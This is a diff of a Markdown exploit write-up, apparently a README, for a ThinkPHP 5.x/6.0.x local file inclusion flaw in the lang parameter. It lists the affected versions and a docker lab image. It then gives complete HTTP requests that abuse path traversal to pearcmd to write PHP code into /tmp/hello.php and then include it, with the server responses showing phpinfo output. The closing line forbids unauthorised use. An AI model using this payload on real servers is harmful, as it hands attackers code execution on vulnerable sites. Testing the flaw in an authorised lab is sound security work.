@@ -10,8 +10,10 @@
 
 ## vuln version
 
-v6.0.1 <= Thinkphp <= v6.0.13
-Thinkphp v5.0.x
+v6.0.1 <= Thinkphp <= v6.0.13  
+
+Thinkphp v5.0.x  
+
 Thinkphp v5.1.x
 
 ## safe version
@@ -31,10 +33,11 @@ docker run -it -d -p 8080:80 7coinsec/thinkphp6013_lang_on
 
 ## EXP
 
-利用pearcmd(docker环境的PHP默认存在，且位置固定)写入文件后，包含
-REQUEST:
-```
+利用pearcmd(docker环境的PHP默认存在，且位置固定)写入文件后，包含  
 
+REQUEST:
+
+```
 GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?phpinfo();?>+/tmp/hello.php HTTP/1.1
 Host: 127.0.0.1:8080
 Cache-Control: max-age=0
@@ -48,7 +51,7 @@ Connection: close
 
 ```
 
-RESPONSE：
+RESPONSE：  
 
 ```
 HTTP/1.1 200 OK
@@ -108,9 +111,10 @@ Successfully created default configuration file "/tmp/hello.php"
 <style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V6.0.13LTS<br/><span style="font-size:30px;">16载初心不改 - 你值得信赖的PHP框架</span></p><span style="font-size:25px;">[ V6.0 版本由 <a href="https://www.yisu.com/" target="yisu">亿速云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ee9b1aa918103c4fc"></think>
 ```
 
-文件包含，直接包含上一步写入的文件或者其他方式上传的文件均可
+文件包含，直接包含上一步写入的文件或者其他方式上传的文件均可  
 
-REQUEST:
+REQUEST:  
+
 ```
 GET /index.php?lang=../../../../../../../../tmp/hello HTTP/1.1
 Host: 127.0.0.1:8080
@@ -124,7 +128,8 @@ Connection: close
 
 ```
 
-RESPONSE:
+RESPONSE:  
+
 ```
 HTTP/1.1 200 OK
 Date: Mon, 12 Dec 2022 07:06:44 GMT
@@ -161,7 +166,10 @@ img {float: right; border: 0;}
 hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
 </style>
 <title>PHP 7.4.0alpha2 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
+......
 ```
+
+## 禁止使用本demo中的方法攻击任何非授权资产
 
 ## LINK
 
